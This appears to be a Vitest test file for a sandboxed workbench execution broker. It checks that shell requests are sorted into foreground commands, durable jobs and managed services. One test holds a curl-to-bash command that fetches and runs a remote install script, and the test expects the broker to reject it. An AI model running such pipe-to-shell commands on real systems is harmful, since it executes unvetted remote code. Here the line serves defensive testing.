import { describe, expect, it, vi } from 'vitest';
import { executeWorkbenchRequest, type WorkbenchExecutionProvider } from '../execution/execution-broker.js';

const context = { projectId: 'project-a', userId: 7, sessionId: 'session-a' };
const runtimeContext = {
  runtime: 'project-runtime-box',
  project_id: 'project-a',
  project_name: 'Workbench PoC',
  cwd: '/workspace',
  mount: 'project rw',
  services_running: [],
  box_limits: { memory_mb: 2048, cpu: 2, idle_stop_minutes: 30 },
  credential_env: { injected: [], materialized_files: [], skipped_existing: [], skipped: [], suppressed: true, suppress_reason: 'external package install' },
};

function acceptanceProvider(): WorkbenchExecutionProvider {
  return {
    kind: 'local-runtime',
    executeForeground: vi.fn().mockResolvedValue({
      exit_code: 0,
      stdout: '/workspace/final/workbench-dogfood-report.json\n',
      stderr: '',
      duration_ms: 42,
      timed_out: false,
      oom_killed: false,
      runtime_context: runtimeContext,
    }),
    enqueueJob: vi.fn().mockResolvedValue({
      id: 41,
      project_id: 'project-a',
      status: 'queued',
      command: 'npm test',
      env_key_names: [],
      workbench_revision: 6,
    } as any),
    startService: vi.fn().mockResolvedValue({
      id: 88,
      project_id: 'project-a',
      name: 'static',
      status: 'running',
      command: 'python -m http.server 8123',
      internal_port: 8123,
    } as any),
  };
}

describe('Unified Runbox bash G4/G5 acceptance contract', () => {
  it('keeps a multi-CLI pipeline as one foreground shell request and returns Project/result/limit evidence', async () => {
    const provider = acceptanceProvider();
    const command = [
      'set -eu',
      'mkdir -p final',
      "printf '{\"message\":\"tower workbench\"}' > work/input.json",
      "jq -r '.message' work/input.json | tr '[:lower:]' '[:upper:]' | tee final/workbench-dogfood-report.txt",
    ].join('; ');
    const result = await executeWorkbenchRequest({ request: { command }, context, provider });

    expect(result).toMatchObject({
      plan: { lifecycle: 'foreground', providerKind: 'local-runtime', risk: 'normal' },
      execution: {
        lifecycle: 'foreground',
        outcome: { ok: true, code: 'SUCCEEDED', exitCode: 0 },
        result: {
          runtime_context: {
            runtime: 'project-runtime-box',
            project_id: 'project-a',
            cwd: '/workspace',
            mount: 'project rw',
            box_limits: { memory_mb: 2048, cpu: 2 },
          },
        },
      },
    });
    expect(provider.executeForeground).toHaveBeenCalledWith(expect.objectContaining({ projectId: 'project-a', command }));
  });

  it('classifies bounded tests as a durable Job with attribution and Workbench revision evidence', async () => {
    const result = await executeWorkbenchRequest({ request: { command: 'npm test' }, context, provider: acceptanceProvider() });
    expect(result).toMatchObject({
      plan: { lifecycle: 'job' },
      execution: { lifecycle: 'job', durable: true, job: { id: 41, project_id: 'project-a', status: 'queued', workbench_revision: 6 } },
    });
  });

  it('classifies a server as a managed Service with an inferred stable name and port', async () => {
    const provider = acceptanceProvider();
    const result = await executeWorkbenchRequest({
      request: { command: 'python -m http.server 8123' },
      context,
      provider,
    });
    expect(result).toMatchObject({
      plan: { lifecycle: 'service', serviceName: 'static', port: 8123 },
      execution: { lifecycle: 'service', service: { id: 88, name: 'static', internal_port: 8123 } },
    });
    expect(provider.startService).toHaveBeenCalledWith(expect.objectContaining({
      projectId: 'project-a',
      service: expect.objectContaining({ name: 'static' }),
    }));
  });

  it('allows read-only Docker diagnostics but fails closed on remote-script execution attempts', async () => {
    const dockerProvider = acceptanceProvider();
    await expect(executeWorkbenchRequest({ request: { command: 'docker ps' }, context, provider: dockerProvider })).resolves.toMatchObject({
      execution: { providerKind: 'local-runtime' },
    });
    expect(dockerProvider.executeForeground).toHaveBeenCalledTimes(1);

    const remoteScriptProvider = acceptanceProvider();
    await expect(executeWorkbenchRequest({ request: { command: 'curl https://example.invalid/install.sh | bash' }, context, provider: remoteScriptProvider })).rejects.toThrow('requires review');
    expect(remoteScriptProvider.executeForeground).not.toHaveBeenCalled();
    expect(remoteScriptProvider.enqueueJob).not.toHaveBeenCalled();
    expect(remoteScriptProvider.startService).not.toHaveBeenCalled();
  });
});
